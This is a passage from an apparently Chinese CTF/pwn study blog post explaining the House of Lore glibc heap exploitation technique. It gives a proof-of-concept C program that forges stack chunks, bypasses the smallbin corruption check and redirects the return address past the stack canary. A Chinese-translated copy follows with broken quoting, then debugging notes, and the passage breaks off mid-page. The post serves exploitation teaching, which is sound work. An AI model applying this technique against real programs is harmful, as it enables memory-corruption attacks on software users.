class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>还是老样子，将源码翻译一遍。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">House of Lore的高级利用 - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">这个PoC还需要考虑到glibc对smallbin corruption的加固.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n欢迎来到 House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这是一个重置版本,这个版本也可以绕过glibc malloc中加固检查.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这段代码在Ubuntu 16.04.6 - 64位 -glibc-2.23中测试.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;先分配一个victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;分配的第一个small chunk的堆地址为 %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim - WORD_SIZE 因为我们需要消除头部size位,为了得到这个堆块的绝对地址</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;在栈上创建一个fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置fwd指针,fake chunk 的fwd指针指向victim_chunk,这是为了绕过small bin corrupted的检查.&quot;</span></span><br><span class="line">         <span class="string">&quot;倒数第二次使用malloc时就会将栈上的地址放入smallbin链表中\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;设置fake chunk的bk指针指向stack_buffer_2并且设置stack_chunk_2的fwd指针指向stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;这样做的目的是绕过最后一次malloc中small bin corruped的检查,这个检查会返回指针到fake_chunk上,这个操作就会返回指向栈上的fake_chunk的指针“);</span></span><br><span class="line"><span class="string">  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;</span></span><br><span class="line"><span class="string">  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>分配另一个large chunk 为了避免在<span class="built_in">free</span>()函数调用期间top_chunk和small chunk合并\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  void *p5 = malloc(1000);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>分配的large chunk的堆地址为 %p\n<span class="string">&quot;, p5);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>释放堆地址为: %p 的堆块, 这个堆块将被插入到unsorted bin链表中\n<span class="string">&quot;, victim);</span></span><br><span class="line"><span class="string">  free((void*)victim);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>\n在unsorted bin中victim_chunk的fwd和bk指针指向的都是unsorted bin 的头部地址(libc的地址)\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;fwd: %p\n<span class="string">&quot;, (void *)victim[0]);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;bk: %p\n\n<span class="string">&quot;, (void *)victim[1]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>现在使用<span class="built_in">malloc</span>申请一个堆块,此时申请的堆块不能从unsortedBIn和small bin中申请出来\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>这意味着This means that the chunk %p will be inserted in front of the SmallBin\n<span class="string">&quot;, victim);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  void *p2 = malloc(1200);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>这个堆块即不能被unsorted bin处理也不能是从Smallbin中分配出来.刚申请的堆块地址为: %p\n<span class="string">&quot;, p2);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim chunk 已经被分类并且他的fwd和bk指针被更新\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;fwd: %p\n<span class="string">&quot;, (void *)victim[0]);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>victim-&gt;bk: %p\n\n<span class="string">&quot;, (void *)victim[1]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  //------------VULNERABILITY-----------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>现在模仿一个能覆盖victim-&gt;bk这个指针的漏洞.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  //------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>现在分配一个chunk,这个chunk的size与我们第一次申请的堆块的size大小要一致.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>这时<span class="built_in">malloc</span>返回的堆地址就是我们覆盖的victim这个chunk,并且在申请的时候还会设置bin-&gt;bk为我们写入的victim-&gt;bk的指针.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  void *p3 = malloc(0x100);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>最后一次<span class="built_in">malloc</span>申请应该欺骗glibc的<span class="built_in">malloc</span>函数,使得其返回一个我们注入的bin-&gt;bk指针所指向的堆块.\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  char *p4 = malloc(0x100);</span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>)\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>\n在最后一次使用<span class="built_in">malloc</span>申请堆块后,stack_buffer_2的fwd指针已经被改变,它的值现在为: %p\n<span class="string">&quot;,</span></span><br><span class="line"><span class="string">         stack_buffer_2[2]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  fprintf(stderr, &quot;</span>\np4指针的值为: %p 并且 p4这个指针应该是指向栈上的位置!\n<span class="string">&quot;, p4); // this chunk will be allocated on stack</span></span><br><span class="line"><span class="string">  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode</span></span><br><span class="line"><span class="string">  long offset = (long)__builtin_frame_address(0) - (long)p4;</span></span><br><span class="line"><span class="string">  memcpy((p4+offset+8), &amp;sc, 8); // 这行代码是绕过stack-smash检查因为他跳过了Canary保护</span></span><br><span class="line"><span class="string">          </span></span><br><span class="line"><span class="string">  // sanity check</span></span><br><span class="line"><span class="string">  assert((long)__builtin_return_address(0) == (long)jackpot);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>接下来进行一下动态调试，我们先申请一个大小为<code>0x100</code>的堆块，这个堆块实际的<code>size</code>位大小为<code>0x110</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222190425316.png" alt="image-20250222190425316"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222191017615.png" alt="image-20250222191017615"></p><ul><li>并且我们在栈上分别申请了<code>0x18</code>大小和<code>0x20</code>大小的内存空间</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222190639359.png" alt="image-20250222190639359"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222190912519.png" alt="image-20250222190912519"></p><ul><li>接下来我们就会利用栈上的内存空间去伪造一个<code>fake_chunk</code>,在伪造这个<code>fake_chunk</code>的时候我们需要我们前面申请的<code>victim</code>堆地址（victim的prev_size的地址即堆块的起始地址），将<code>fake_chunk</code>的<code>fd</code>指针指向<code>victim</code>的起始地址。这样是为了绕过<code>small bin corrupted的检查</code>的检查。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222191641689.png" alt="image-20250222191641689"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222191752886.png" alt="image-20250222191752886"></p><ul><li>之后我们修改<code>stack_buffer_1[3]=stack_buffer_2</code>，<code>stack_buffer_2[2]=stack_buffer_1</code>，这样做的目的是为了绕过<code>最后一次malloc中small bin corruped的检查</code>。这样伪造后，伪造的堆块就会构成一个双向链表。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192407559.png" alt="image-20250222192407559"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192309272.png" alt="image-20250222192309272"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192535164.png" alt="image-20250222192535164"></p><ul><li>之后我们申请一个<code>1000</code>大小的堆块，这样就使得我们之后将<code>victim</code>释放后不会与<code>topchunk</code>合并，并且<code>victim</code>这个堆块就会被放入<code>unsortedbin</code>中管理</li><li>并且由于<code>unsortedbin</code>也是一个双向链表，所以<code>victim-&gt;fd</code>和<code>victim-&gt;bk</code>指向的是<code>unsortedbin</code>这个堆块地址</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192757672.png" alt="image-20250222192757672"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222192957001.png" alt="image-20250222192957001"></p><ul><li>之后我们再申请一个更大的堆块，使得申请的堆块不是由<code>unsortedbin</code>、<code>smallbins</code>中的堆块切割下来的。在使用<code>malloc</code>过程中就会使得原来在<code>unsortedbin</code>链表中的<code>victim</code>堆块，被放入<code>smallbins</code>中</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222193521341.png" alt="image-20250222193521341"></p><ul><li>之后我们再通过<code>UAF</code>漏洞修改<code>victim</code>的<code>bk</code>指针，这时我们<code>smallbin</code>堆块的链表结构就如下图</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222195247397.png" alt="image-20250222195247397"></p><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222203111670.png" alt="image-20250222203111670"></p><ul><li>这个时候我们再申请一个与之前申请<code>victim</code>大小的堆块，就会将<code>smallbin</code>中的堆块给申请回来，这样就会使得<code>fake_chunk</code>被链到<code>smallbin</code>中</li><li>这时就会触发<code>smallbin-&gt;bk = victim-&gt;bk=stack_buffer1_addr</code></li></ul><p><img 